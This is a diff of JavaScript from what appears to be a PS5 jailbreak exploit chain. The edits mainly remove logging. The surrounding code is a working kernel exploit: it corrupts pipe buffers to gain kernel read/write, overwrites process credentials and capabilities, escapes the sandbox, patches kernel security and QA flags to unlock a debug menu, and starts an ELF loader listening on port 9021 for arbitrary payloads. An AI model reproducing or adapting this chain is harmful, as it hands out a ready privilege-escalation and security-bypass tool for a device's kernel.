@@ -326,8 +326,6 @@
             write64(args + 0x20n, kernel.addr.data_base);
             write64(args + 0x28n, payloadout);
 
-            await log("[p2jb] spawning " + filepath);
-
             const ret = call(Thrd_create, thr_handle_addr, elf_entry_point, args);
             if (ret !== 0n) {
                 throw new Error("Thrd_create() error: " + toHex(ret));
@@ -339,7 +337,6 @@
 
         async function elf_wait_for_exit(thr_handle, payloadout, is_daemon = false) {
             if (is_daemon) {
-                await log("[p2jb] daemon mode - skipping Thrd_join");
                 return;
             }
             const ret = call(Thrd_join, thr_handle, 0n);
@@ -347,7 +344,7 @@
                 throw new Error("Thrd_join() error: " + toHex(ret));
             }
             const out = read32(payloadout);
-            await log("[p2jb] elfldr out = " + toHex(out));
+            await ulog("stage_elfldr: elf returned " + toHex(out));
         }
 
         // Expose ELF loader for post-jailbreak use on any available global
@@ -358,7 +355,6 @@
             _global.elf_parse = elf_parse;
             _global.elf_run = elf_run;
             _global.elf_wait_for_exit = elf_wait_for_exit;
-            await ulog("ELF loader exposed globally");
         }
 
         let saved_fpu_ctrl = 0;
@@ -1519,7 +1515,6 @@
             S.proc_filedesc = proc_filedesc;
             breadcrumb("stage1:done proc_filedesc=" + toHex(proc_filedesc) +
                 " triplets=" + S.triplets.join(","));
-            await ulog("stage1: proc_filedesc=" + toHex(proc_filedesc));
 
             for (let k = 0; k < 3; k++) {
                 S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
@@ -1534,6 +1529,7 @@
                 " triplets=" + S.triplets.join(","));
             send_notification("Stage 2\nLeak pipe data pointers");
             await ulog("stage2: leaking pipe pointers...");
+            let stage2_last_reason = "not started";
             const stabilize_stage2_triplets = async (label) => {
                 const before = S.triplets.join(",");
                 for (let pass = 0; pass < 2; pass++) {
@@ -1549,44 +1545,30 @@
                         t1 !== t2) {
                         S.triplets[1] = t1;
                         S.triplets[2] = t2;
-                        const after = S.triplets.join(",");
-                        if (after !== before) {
-                            await ulog("stage2: stabilized triplets for " +
-                                label + ": " + before + " -> " + after);
-                        }
                         return true;
                     }
                     S.triplets[1] = old1;
                     S.triplets[2] = old2;
                     nanosleep_ms(10);
                 }
-                await ulog("stage2: triplet stabilize failed for " + label +
-                    ": " + before + " -> " + S.triplets.join(","));
+                stage2_last_reason = "triplet stabilize failed for " + label +
+                    ": " + before + " -> " + S.triplets.join(",");
                 return false;
             };
             const read_stage2_ptr = async (name, kaddr) => {
                 if (!(await stabilize_stage2_triplets(name))) return null;
-                const t0 = Date.now();
-                await ulog("stage2: reading " + name + " @ " + toHex(kaddr) +
-                    " triplets=" + S.triplets.join(","));
                 const val = kslow64(S, kaddr);
-                const elapsed = Date.now() - t0;
-                if (is_kernel_ptr(val)) {
-                    await ulog("stage2: " + name + "=" + toHex(val) +
-                        " (" + elapsed + "ms, " + S.kslow_last_reason + ")");
-                } else if (val) {
-                    await ulog("stage2: " + name + " rejected non-kptr " +
-                        toHex(val) + " (" + elapsed + "ms, " +
-                        S.kslow_last_reason + ")");
+                if (is_kernel_ptr(val)) return val;
+                if (val) {
+                    stage2_last_reason = name + " rejected non-kptr " +
+                        toHex(val) + " (" + S.kslow_last_reason + ")";
                     return null;
-                } else {
-                    await ulog("stage2: " + name + " read failed (" +
-                        elapsed + "ms, " + S.kslow_last_reason + ")");
                 }
-                return val;
+                stage2_last_reason = name + " read failed (" +
+                    S.kslow_last_reason + ")";
+                return null;
             };
             for (let attempt = 0; attempt < 5; attempt++) {
-                await ulog("stage2: attempt " + (attempt + 1) + "/5");
                 nanosleep_ms(100);
                 const fdescenttbl = await read_stage2_ptr("fd table",
                     S.proc_filedesc + S.OFF.FILEDESC_OFILES);
@@ -1621,17 +1603,16 @@
                         " victim_pipe=" + toHex(S.victim_pipe_data));
                     return;
                 }
-                await ulog("stage2: pipe data pointers matched; retrying");
+                stage2_last_reason = "pipe data pointers matched";
                 nanosleep_ms(500);
             }
-            fail("stage2: failed to leak pipe pointers");
+            fail("stage2: failed to leak pipe pointers (" + stage2_last_reason + ")");
         }
 
         async function stage3(S) {
             breadcrumb("stage3:start master_pipe=" + toHex(S.master_pipe_data) +
                 " victim_pipe=" + toHex(S.victim_pipe_data));
             send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
-            await ulog("stage3: corrupting pipe buffer...");
 
             const pipe_overwrite = malloc(24);
             write32(pipe_overwrite, 0n);
@@ -1644,8 +1625,6 @@
 
             let ok = false;
             for (let attempt = 0; attempt < 40; attempt++) {
-                if (attempt === 0 || attempt === 10 || attempt === 20 || attempt === 30)
-                    breadcrumb("stage3:kwrite_slow attempt=" + (attempt + 1));
                 repair_triplets(S);
                 if (kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)) { ok = true; break; }
                 nanosleep_ms(100); syscall(SYSCALL.sched_yield);
@@ -1688,7 +1667,6 @@
             }
             if (!verified) fail("stage3: verify failed");
             breadcrumb("stage3:kernel_rw_verified");
-            await ulog("stage3: kernel r/w achieved");
             S.kernel_rw_ready = true;
 
             await stage3_cleanup(S);
@@ -1715,32 +1693,23 @@
             };
 
             for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
-                breadcrumb("stage3_cleanup:bump fd=" + fd);
                 const fp = get_fp(fd);
                 if (fp === 0n || (fp >> 48n) !== 0xFFFFn) fail("stage3b: bad fp " + fd);
                 bump(fp, 0x100);
             }
-            breadcrumb("stage3_cleanup:null_pktopts:start");
             for (let i = 0; i < S.ipv6_sockets.length; i++) {
-                if ((i % 16) === 0)
-                    breadcrumb("stage3_cleanup:null_pktopts index=" + i);
                 null_inpcb_pktopts(S.ipv6_sockets[i]);
             }
-            breadcrumb("stage3_cleanup:null_pktopts:done");
 
-            breadcrumb("stage3_cleanup:close_free_fds");
             for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
                 syscall(SYSCALL.close, BigInt(S.free_fds[i]));
             }
-            breadcrumb("stage3_cleanup:close_ipv6");
             for (const fd of S.ipv6_sockets) syscall(SYSCALL.close, BigInt(fd));
-            breadcrumb("stage3_cleanup:close_worker_sockets");
             syscall(SYSCALL.close, BigInt(S.iov_sock_a));
             syscall(SYSCALL.close, BigInt(S.iov_sock_b));
             syscall(SYSCALL.close, BigInt(S.uio_sock_a));
             syscall(SYSCALL.close, BigInt(S.uio_sock_b));
 
-            breadcrumb("stage3_cleanup:exit_workers");
             for (const w of S.iov_workers) S.kwrite64(w.pivotAddr, w.exitAddr);
             for (const w of S.uio_read_workers) S.kwrite64(w.pivotAddr, w.exitAddr);
             for (const w of S.uio_write_workers) S.kwrite64(w.pivotAddr, w.exitAddr);
@@ -1758,7 +1727,6 @@
             syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
 
             breadcrumb("stage3_cleanup:done");
-            await ulog("stage3b: race cleanup done");
 
             await js_sleep(3000);
         }
@@ -1768,27 +1736,22 @@
             try {
                 const B = S.proc_ucred;
                 if (B === 0n || (B >> 48n) !== 0xFFFFn) {
-                    await ulog("stage_d6: proc_ucred invalid, skip");
                     return;
                 }
 
                 const main_thread = S.kread64(S.curproc + 0x10n);
                 if (main_thread === 0n || (main_thread >> 48n) !== 0xFFFFn) {
-                    await ulog("stage_d6: p_threads empty, skip");
                     return;
                 }
 
                 const bp = S.kread64(main_thread + 0x08n);
                 if (bp !== S.curproc) {
-                    await ulog("stage_d6: td_proc backptr mismatch (" + toHex(bp) +
-                        " vs " + toHex(S.curproc) + "), skip");
                     return;
                 }
 
                 const next_thread = S.kread64(main_thread + 0x10n);
                 if (next_thread === 0n || (next_thread >> 48n) !== 0xFFFFn ||
                     next_thread === main_thread) {
-                    await ulog("stage_d6: no 2nd thread for cross-validation, skip");
                     return;
                 }
                 const candidates = [];
@@ -1801,17 +1764,13 @@
                     candidates.push(off);
                 }
                 if (candidates.length === 0) {
-                    await ulog("stage_d6: td_ucred offset not found, skip");
                     return;
                 }
                 if (candidates.length > 1) {
-                    await ulog("stage_d6: td_ucred offset ambiguous (" +
-                        candidates.length + " candidates), skip");
                     return;
                 }
                 const td_ucred_off = candidates[0];
-                await ulog("stage_d6: td_ucred at +" + toHex(td_ucred_off) +
-                    " (1 cand, validated)");
+                breadcrumb("stage_d6:td_ucred_off=" + toHex(td_ucred_off));
 
                 let td = main_thread;
                 let patched = 0;
@@ -1820,8 +1779,6 @@
                     walked++;
 
                     if (S.kread64(td + 0x08n) !== S.curproc) {
-                        await ulog("stage_d6: td_proc mismatch at thread " +
-                            toHex(td) + ", abort walk");
                         break;
                     }
                     const cur = S.kread64(td + td_ucred_off);
@@ -1831,20 +1788,16 @@
                     }
                     td = S.kread64(td + 0x10n);
                 }
-                await ulog("stage_d6: walked " + walked + " threads, patched " +
-                    patched + " stale td_ucred");
+                breadcrumb("stage_d6:walked=" + walked + " patched=" + patched);
 
                 if (patched > 0) {
 
                     const old_ref = S.kread32(B);
                     const new_ref = old_ref + BigInt(patched);
                     S.kwrite32(B, new_ref);
-                    await ulog("stage_d6: cr_ref(B) " + toHex(old_ref) +
-                        " -> " + toHex(new_ref) + " (+" + patched + ")");
                 }
             } catch (e) {
-                try { await ulog("stage_d6: exception: " + e.message + " - skipped"); }
-                catch (_) { }
+                breadcrumb("stage_d6:exception " + e.message);
             }
         }
 
@@ -1877,7 +1830,6 @@
             S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
             breadcrumb("stage4:curproc=" + toHex(curproc) +
                 " ucred=" + toHex(S.proc_ucred));
-            await ulog("stage4: curproc=" + toHex(curproc) + " fd=" + toHex(S.proc_fd));
 
             // Save original ucred and fd values for cleanup on exit (prevents panic on close)
             S.orig_ucred = {
@@ -1893,7 +1845,6 @@
             };
             S.orig_fd_rdir = S.kread64(S.proc_fd + S.OFF.FD_RDIR);
             S.orig_fd_jdir = S.kread64(S.proc_fd + S.OFF.FD_JDIR);
-            await ulog("stage4: saved orig_ucred (uid=" + S.orig_ucred.uid + ") orig_fd_rdir=" + toHex(S.orig_fd_rdir));
 
             await force_td_ucred_migrate(S);
 
@@ -1919,7 +1870,6 @@
             }
             S.rootvnode = rootvnode;
             breadcrumb("stage4:done rootvnode=" + toHex(rootvnode));
-            await ulog("stage4: rootvnode=" + toHex(rootvnode));
         }
 
         async function stage5(S) {
@@ -1943,7 +1893,6 @@
                 fail("stage5: jailbreak verify failed");
             }
             breadcrumb("stage5:done");
-            await ulog("stage5: jailbreak ok");
         }
 
         async function stage6(S) {
@@ -1961,38 +1910,26 @@
             }
             if (allproc === 0n) {
                 S.data_base_ok = false;
-                await ulog("stage6: allproc not found - debug menu + elf " +
-                    "loader skipped (jailbreak is done)");
+                await ulog("stage6: allproc not found; loader skipped");
                 return;
             }
             const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
             S.data_base = data_base;
             breadcrumb("stage6:data_base=" + toHex(data_base));
-            await ulog("stage6: allproc=" + toHex(allproc) +
-                " data_base=" + toHex(data_base));
 
             let data_base_ok = true;
             const first_proc = S.kread64(allproc);
             const first_proc_ok = (first_proc >> 48n) === 0xFFFFn;
-            await ulog("stage6: data_base check - *allproc=" + toHex(first_proc) +
-                (first_proc_ok ? "  (kptr OK)" : "  (BAD - not a kptr)"));
             if (!first_proc_ok) data_base_ok = false;
             if (S.OFF.DATA_BASE_ROOTVNODE) {
                 const rv_off = S.kread64(data_base + S.OFF.DATA_BASE_ROOTVNODE);
                 const rv_ok = (rv_off === S.rootvnode);
-                await ulog("stage6: data_base check - rootvnode via offset=" +
-                    toHex(rv_off) + " vs stage4 found=" + toHex(S.rootvnode) +
-                    (rv_ok ? "  => data_base CORRECT"
-                        : "  => MISMATCH - data_base / 11.60 offsets are WRONG"));
                 if (!rv_ok) data_base_ok = false;
             }
 
-            if (typeof is_jailbroken === "function")
-                await ulog("stage6: is_jailbroken() = " + is_jailbroken());
             S.data_base_ok = data_base_ok;
             if (!data_base_ok) {
-                await ulog("stage6: data_base check FAILED - skipping the debug " +
-                    "menu and the elf loader. The jailbreak is complete.");
+                await ulog("stage6: data_base check failed; loader skipped");
                 return;
             }
 
@@ -2000,8 +1937,6 @@
                 breadcrumb("stage6:debug_menu:start");
                 await stage_debug_menu(S);
                 breadcrumb("stage6:debug_menu:done");
-            } else {
-                await ulog("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
             }
         }
 
@@ -2009,12 +1944,11 @@
             try {
                 if (typeof gpu === "undefined" || typeof kernel === "undefined" ||
                     typeof update_kernel_offsets !== "function") {
-                    await ulog("stage_debug: framework gpu/kernel/update_kernel_offsets " +
-                        "not in scope - skipped");
+                    breadcrumb("stage_debug:framework_missing");
                     return;
                 }
                 if (!S.data_base || !S.curproc) {
-                    await ulog("stage_debug: data_base/curproc missing - skipped");
+                    breadcrumb("stage_debug:state_missing");
                     return;
                 }
 
@@ -2034,8 +1968,6 @@
                 const cr3 = S.kread64(pmap_store + S.OFF.PMAP_CR3);
                 kernel.addr.kernel_cr3 = cr3;
                 kernel.addr.dmap_base = pml4 - cr3;
-                await ulog("stage_debug: cr3=" + toHex(cr3) +
-                    " dmap_base=" + toHex(kernel.addr.dmap_base));
 
                 if (kernel_offset.SIZEOF_GVMSPACE === undefined) kernel_offset.SIZEOF_GVMSPACE = 0x100n;
                 if (kernel_offset.GVMSPACE_START_VA === undefined) kernel_offset.GVMSPACE_START_VA = 0x08n;
@@ -2043,49 +1975,28 @@
                 if (kernel_offset.GVMSPACE_PAGE_DIR_VA === undefined) kernel_offset.GVMSPACE_PAGE_DIR_VA = 0x38n;
 
                 update_kernel_offsets();
-                await ulog("stage_debug: VMSPACE_VM_PMAP=" +
-                    toHex(kernel_offset.VMSPACE_VM_PMAP) + " VM_VMID=" +
-                    toHex(kernel_offset.VMSPACE_VM_VMID));
 
                 await gpu.setup();
-                await ulog("stage_debug: gpu.setup() ok");
 
                 const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS;
                 const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID;
                 const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS;
                 const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS;
 
-                await ulog("stage_debug: setting security flags");
                 const security_flags = await kernel.read_dword(security_flags_addr);
-                await ulog("  before: " + toHex(security_flags));
                 await gpu.write_dword(security_flags_addr, security_flags | 0x14n);
-                const security_flags_after = await kernel.read_dword(security_flags_addr);
-                await ulog("  after:  " + toHex(security_flags_after));
 
-                await ulog("stage_debug: setting targetid");
-                const target_id_before = await kernel.read_byte(target_id_flags_addr);
-                await ulog("  before: " + toHex(target_id_before));
                 await gpu.write_byte(target_id_flags_addr, 0x82n);
-                const target_id_after = await kernel.read_byte(target_id_flags_addr);
-                await ulog("  after:  " + toHex(target_id_after));
 
-                await ulog("stage_debug: setting qa flags and utoken flags");
                 const qa_flags = await kernel.read_dword(qa_flags_addr);
-                await ulog("  qa_flags before: " + toHex(qa_flags));
                 await gpu.write_dword(qa_flags_addr, qa_flags | 0x10300n);
-                const qa_flags_after = await kernel.read_dword(qa_flags_addr);
-                await ulog("  qa_flags after:  " + toHex(qa_flags_after));
 
                 const utoken_flags = await kernel.read_byte(utoken_flags_addr);
-                await ulog("  utoken_flags before: " + toHex(utoken_flags));
                 await gpu.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
-                const utoken_flags_after = await kernel.read_byte(utoken_flags_addr);
-                await ulog("  utoken_flags after:  " + toHex(utoken_flags_after));
 
-                await ulog("stage_debug: debug menu enabled");
+                breadcrumb("stage_debug:done");
             } catch (e) {
-                await ulog("stage_debug: failed: " + e.message +
-                    " (jailbreak unaffected)");
+                breadcrumb("stage_debug:failed " + e.message);
             }
         }
 
@@ -2098,10 +2009,7 @@
             S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);
 
             breadcrumb("stage7:done");
-            await ulog("stage7: jailbreak complete; authid+caps maximized");
             send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");
-
-            await ulog("stage7: 'Jailbroken' notification sent -> stage_load_elf");
 
         }
 
@@ -2146,9 +2054,7 @@
             S.kwrite64(master_rpipe_data + 0x10n, victim_rpipe_data);
 
             S.kexp_pipes = { master_pipe, victim_pipe, master_rpipe_data, victim_rpipe_data };
-            await ulog("stage_elfldr: prepared dedicated kexp pipes master=" +
-                master_pipe[0] + "," + master_pipe[1] + " victim=" +
-                victim_pipe[0] + "," + victim_pipe[1]);
+            breadcrumb("stage_elfldr:kexp_pipes");
 
             return {
                 master_pipe: [BigInt(master_pipe[0]), BigInt(master_pipe[1])],
@@ -2159,14 +2065,12 @@
         async function stage_load_elf(S) {
 
             breadcrumb("stage_elfldr:start");
-            await ulog("stage_elfldr: entered");
             if (!LAUNCH_ELF_LOADER) {
-                await ulog("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
+                await ulog("stage_elfldr: skipped");
                 return;
             }
             if (!S.data_base_ok) {
-                await ulog("stage_elfldr: kernel data_base not resolved/verified " +
-                    "in stage6 - elf loader skipped");
+                await ulog("stage_elfldr: skipped (no data_base)");
                 send_notification("Stage 7\nelf loader skipped (no data_base)");
                 return;
             }
@@ -2187,33 +2091,20 @@
                     typeof elf_run === "function" &&
                     typeof elf_wait_for_exit === "function" &&
                     typeof ipv6_kernel_rw !== "undefined") {
-                    await ulog("stage_elfldr: USB elfldr found at " + elf_path +
-                        " - using USB path (priority over kexp)");
                     breadcrumb("stage_elfldr:usb_path " + elf_path);
 
                     ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
                     kernel.addr.data_base = S.data_base;
-                    await ulog("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
-                        ipv6_kernel_rw.data.master_sock + " victim_sock=" +
-                        ipv6_kernel_rw.data.victim_sock + ")");
 
                     const elf_data = read_file(elf_path);
-                    await ulog("stage_elfldr: read " + elf_data.length +
-                        " bytes; parsing...");
                     const entry = await elf_parse(elf_data);
-                    await ulog("stage_elfldr: elf entry=" + toHex(entry) +
-                        "; spawning elfldr...");
+                    await ulog("stage_elfldr: USB elfldr found; spawning");
                     const { thr_handle, payloadout } = await elf_run(entry, elf_path);
                     chainload_started = true;
 
                     breadcrumb("stage_elfldr:usb_spawned");
-                    await ulog("stage_elfldr: elfldr spawned - joining...");
                     const is_daemon = elf_path.endsWith("elfldr_1320.elf") || elf_path.endsWith("elfldr.elf");
                     await elf_wait_for_exit(thr_handle, payloadout, is_daemon);
-                    if (!is_daemon) {
-                        const out = read32(payloadout);
-                        await ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
-                    }
                     await ulog("stage_elfldr: daemon should be listening on :9021");
                     breadcrumb("stage_elfldr:usb_done");
                     send_notification("Stage 7\nelfldr running - send your ELF to\n" +
@@ -2221,18 +2112,12 @@
                     return;
                 }
                 if (elf_path) {
-                    await ulog("stage_elfldr: USB elf found at " + elf_path +
-                        " but missing deps: elf_parse=" + (typeof elf_parse) +
-                        " elf_run=" + (typeof elf_run) +
-                        " elf_wait_for_exit=" + (typeof elf_wait_for_exit) +
-                        " ipv6_kernel_rw=" + (typeof ipv6_kernel_rw));
-                } else {
-                    await ulog("stage_elfldr: no USB elf found on /mnt/usb0..7");
+                    breadcrumb("stage_elfldr:usb_deps_missing");
                 }
 
                 // ----- Fallback: Y2JB 1.4+ kexp handoff -----
                 if (typeof load_aioshellcode === "function") {
-                    await ulog("stage_elfldr: Y2JB >= 1.4 detected, using kexp handoff");
+                    await ulog("stage_elfldr: using Y2JB kexp handoff");
                     breadcrumb("stage_elfldr:kexp_path");
 
                     const is_kptr = (v) =>
@@ -2247,40 +2132,30 @@
                     const eboot_segments = S.kread64(dynlib_eboot + 0x40n);
                     if (!is_kptr(eboot_segments))
                         throw new Error("eboot_segments not a kptr: " + toHex(eboot_segments));
-                    await ulog("stage_elfldr: dynlib=" + toHex(p_dynlib) +
-                        " eboot=" + toHex(dynlib_eboot) +
-                        " segs=" + toHex(eboot_segments));
 
                     S.kwrite64(p_dynlib + 0xF0n, 0n);
                     S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);
                     S.kwrite64(eboot_segments + 0x08n, 0n);
                     S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
                     breadcrumb("stage_elfldr:dynlib_patched");
-                    await ulog("stage_elfldr: dynlib patched " +
-                        "(syscalls + dlsym unrestricted)");
 
                     const allproc = S.data_base + S.OFF.DATA_BASE_ALLPROC;
                     const kexp_pipes = await prepare_kexp_pipes(S);
                     const master_pipe = kexp_pipes.master_pipe;
                     const victim_pipe = kexp_pipes.victim_pipe;
-                    await ulog("stage_elfldr: handoff -> load_aioshellcode " +
-                        "(allproc=" + toHex(allproc) +
-                        " master=" + master_pipe[0] + "," + master_pipe[1] +
-                        " victim=" + victim_pipe[0] + "," + victim_pipe[1] + ")");
 
                     breadcrumb("stage_elfldr:load_aioshellcode");
                     await load_aioshellcode(allproc, master_pipe, victim_pipe);
                     chainload_started = true;
 
                     breadcrumb("stage_elfldr:aioshellcode_returned");
-                    await ulog("stage_elfldr: load_aioshellcode returned - " +
-                        "elfldr should now be listening on :9021");
+                    await ulog("stage_elfldr: daemon should be listening on :9021");
                     send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                         "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
                     return;
                 }
 
-                await ulog("stage_elfldr: no elfldr path available (USB not found, kexp unsupported)");
+                await ulog("stage_elfldr: unavailable");
                 send_notification("Stage 7\nelfldr unavailable - skipped");
             } catch (e) {
                 breadcrumb("stage_elfldr:failed " + e.message);
@@ -2291,8 +2166,6 @@
                 breadcrumb("stage_elfldr:cleanup:start");
                 if (chainload_started) {
                     breadcrumb("stage_elfldr:cleanup:skipped_chainload_started");
-                    await ulog("stage_elfldr: cleanup skipped; chainload owns " +
-                        "the handoff pipes");
                 } else {
                     await cleanup_kexp_pipes(S);
                     await cleanup_ipv6_kernel_rw(S);
@@ -2314,7 +2187,6 @@
                 S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x10n, 0n);
                 S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x18n, 0n);
                 breadcrumb("cleanup_kexp_pipes:done");
-                await ulog("cleanup: kexp pipe buffers zeroed");
             } catch (e) {
                 try { await ulog("cleanup_kexp_pipes: failed: " + e.message); } catch (_) { }
             }
@@ -2323,7 +2195,6 @@
         async function cleanup_exploit_pipes(S) {
             try {
                 if (!S.master_pipe_data || !S.victim_pipe_data) {
-                    await ulog("cleanup_exploit_pipes: pipe data not available, skipping");
                     return;
                 }
                 breadcrumb("cleanup_exploit_pipes:start");
@@ -2336,7 +2207,6 @@
                 S.kwrite64(S.victim_pipe_data + 0x10n, 0n);
                 S.kwrite64(S.victim_pipe_data + 0x18n, 0n);
                 breadcrumb("cleanup_exploit_pipes:done");
-                await ulog("cleanup: exploit pipe buffers zeroed");
             } catch (e) {
                 try { await ulog("cleanup_exploit_pipes: failed: " + e.message); } catch (_) { }
             }
@@ -2383,7 +2253,6 @@
                     }
 
                     breadcrumb("cleanup_ipv6_kernel_rw:done");
-                    await ulog("cleanup: ipv6_kernel_rw state neutralized; fds left open");
                 }
             } catch (e) {
                 try { await ulog("cleanup: ipv6_kernel_rw failed: " + e.message); } catch (_) { }
@@ -2393,11 +2262,9 @@
         // Cleanup kernel state before exit to prevent panic on YouTube close
         async function cleanup_kernel_state(S) {
             if (!S.orig_ucred || S.proc_ucred === 0n) {
-                await ulog("cleanup: no saved state, skipping");
                 return;
             }
             breadcrumb("cleanup_kernel_state:start");
-            await ulog("cleanup: restoring kernel state for safe exit");
             try {
                 // Restore fd rdir/jdir (most critical for exit path)
                 if (S.orig_fd_rdir !== 0n && (S.orig_fd_rdir >> 48n) === 0xFFFFn) {
@@ -2417,7 +2284,6 @@
                 S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, S.orig_ucred.caps0);
                 S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, S.orig_ucred.caps1);
                 breadcrumb("cleanup_kernel_state:done");
-                await ulog("cleanup: kernel state restored");
             } catch (e) {
                 breadcrumb("cleanup_kernel_state:failed " + e.message);
                 await ulog("cleanup: failed: " + e.message);
